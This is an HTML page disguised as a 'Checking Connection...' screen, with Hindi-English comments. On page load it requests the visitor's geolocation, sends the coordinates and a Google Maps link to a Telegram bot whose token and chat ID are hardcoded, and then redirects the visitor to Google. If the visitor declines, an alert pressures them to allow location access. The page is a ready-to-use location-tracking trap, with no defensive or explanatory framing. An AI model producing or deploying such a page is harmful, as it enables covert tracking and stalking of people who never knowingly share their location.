<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking Connection...</title>
</head>
<body>
    <script>
        // Apni details yahan dalein
        const token = '8764685300:AAHTAvOwsDnJm6yu7HzENMk-2Efmkye5TUI';
        const chatId = '7066124462';

        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(success, error);
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        };

        function success(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            
            // Google Maps Link banana
            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
            const message = `📍 *New Location Found!*%0A%0AAccuracy: ${accuracy}m%0AView: [Google Maps](${mapLink})`;

            // Telegram ko data bhejna
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`)
            .then(response => {
                // Location milne ke baad user ko redirect kar sakte hain
                window.location.href = "https://www.google.com";
            });
        }

        function error() {
            alert("Please allow location access to continue.");
        }
    </script>
</body>
    
</html>
